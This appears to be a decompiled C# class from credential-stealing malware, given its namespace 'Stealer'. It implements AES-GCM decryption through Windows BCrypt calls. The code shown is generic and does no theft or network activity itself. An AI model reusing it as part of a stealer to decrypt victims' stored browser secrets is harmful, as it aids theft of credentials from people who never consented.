using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Stealer
{
	// Token: 0x02000004 RID: 4
	internal class cAesGcm
	{
		// Token: 0x0600000B RID: 11 RVA: 0x00002500 File Offset: 0x00000700
		public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
		{
			IntPtr intPtr = this.OpenAlgorithmProvider(cBCrypt.BCRYPT_AES_ALGORITHM, cBCrypt.MS_PRIMITIVE_PROVIDER, cBCrypt.BCRYPT_CHAIN_MODE_GCM);
			IntPtr hKey;
			IntPtr hglobal = this.ImportKey(intPtr, key, out hKey);
			cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO bcrypt_AUTHENTICATED_CIPHER_MODE_INFO = new cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
			byte[] array2;
			using (bcrypt_AUTHENTICATED_CIPHER_MODE_INFO)
			{
				byte[] array = new byte[this.MaxAuthTagSize(intPtr)];
				int num = 0;
				uint num2 = cBCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, null, 0, ref num, 0);
				if (num2 != 0U)
				{
					throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", num2));
				}
				array2 = new byte[num];
				num2 = cBCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, array2, array2.Length, ref num, 0);
				if (num2 == cBCrypt.STATUS_AUTH_TAG_MISMATCH)
				{
					throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
				}
				if (num2 != 0U)
				{
					throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", num2));
				}
			}
			cBCrypt.BCryptDestroyKey(hKey);
			Marshal.FreeHGlobal(hglobal);
			cBCrypt.BCryptCloseAlgorithmProvider(intPtr, 0U);
			return array2;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002610 File Offset: 0x00000810
		private int MaxAuthTagSize(IntPtr hAlg)
		{
			byte[] property = this.GetProperty(hAlg, cBCrypt.BCRYPT_AUTH_TAG_LENGTH);
			return BitConverter.ToInt32(new byte[]
			{
				property[4],
				property[5],
				property[6],
				property[7]
			}, 0);
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002650 File Offset: 0x00000850
		private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
		{
			IntPtr zero = IntPtr.Zero;
			uint num = cBCrypt.BCryptOpenAlgorithmProvider(out zero, alg, provider, 0U);
			if (num != 0U)
			{
				throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", num));
			}
			byte[] bytes = Encoding.Unicode.GetBytes(chainingMode);
			num = cBCrypt.BCryptSetAlgorithmProperty(zero, cBCrypt.BCRYPT_CHAINING_MODE, bytes, bytes.Length, 0);
			if (num != 0U)
			{
				throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", num));
			}
			return zero;
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000026C0 File Offset: 0x000008C0
		private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
		{
			int num = BitConverter.ToInt32(this.GetProperty(hAlg, cBCrypt.BCRYPT_OBJECT_LENGTH), 0);
			IntPtr intPtr = Marshal.AllocHGlobal(num);
			byte[] array = this.Concat(new byte[][]
			{
				cBCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC,
				BitConverter.GetBytes(1),
				BitConverter.GetBytes(key.Length),
				key
			});
			uint num2 = cBCrypt.BCryptImportKey(hAlg, IntPtr.Zero, cBCrypt.BCRYPT_KEY_DATA_BLOB, out hKey, intPtr, num, array, array.Length, 0U);
			if (num2 != 0U)
			{
				throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", num2));
			}
			return intPtr;
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002748 File Offset: 0x00000948
		private byte[] GetProperty(IntPtr hAlg, string name)
		{
			int num = 0;
			uint num2 = cBCrypt.BCryptGetProperty(hAlg, name, null, 0, ref num, 0U);
			if (num2 != 0U)
			{
				throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", num2));
			}
			byte[] array = new byte[num];
			num2 = cBCrypt.BCryptGetProperty(hAlg, name, array, array.Length, ref num, 0U);
			if (num2 != 0U)
			{
				throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", num2));
			}
			return array;
		}

		// Token: 0x06000010 RID: 16 RVA: 0x000027B0 File Offset: 0x000009B0
		public byte[] Concat(params byte[][] arrays)
		{
			int num = 0;
			foreach (byte[] array in arrays)
			{
				if (array != null)
				{
					num += array.Length;
				}
			}
			byte[] array2 = new byte[num - 1 + 1];
			int num2 = 0;
			foreach (byte[] array3 in arrays)
			{
				if (array3 != null)
				{
					Buffer.BlockCopy(array3, 0, array2, num2, array3.Length);
					num2 += array3.Length;
				}
			}
			return array2;
		}
	}
}
